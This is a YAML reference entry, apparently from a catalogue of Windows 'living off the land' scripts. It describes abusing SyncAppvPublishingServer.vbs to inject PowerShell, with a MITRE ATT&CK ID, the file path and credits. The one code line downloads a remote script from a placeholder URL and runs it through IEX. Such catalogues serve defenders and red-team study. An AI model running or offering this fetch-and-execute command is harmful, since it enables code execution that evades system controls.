---
name: Syncappvpublishingserver.vbs
description: Script used related to app-v and publishing server
functions:
  execute:
    - description: Inject PowerShell script code with the provided arguments
      code: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
      mitreid: T1216
      mitrelink: https://attack.mitre.org/wiki/Technique/T1216
      operatingsystem: Windows 10
      privileges: User
      usecase: Use Powershell host invoked from vbs script
resources:
    - resource: https://twitter.com/monoxgas/status/895045566090010624
    - resource: https://twitter.com/subTee/status/855738126882316288
fullpath:
    - path: C:\Windows\System32\SyncAppvPublishingServer.vbs
detection:
  - IOC: 
acknowledgement:
  - Person: Nick Landers
    Handle: '@monoxgas'
  - Person: Casey Smith
    Handle: '@subtee'
---
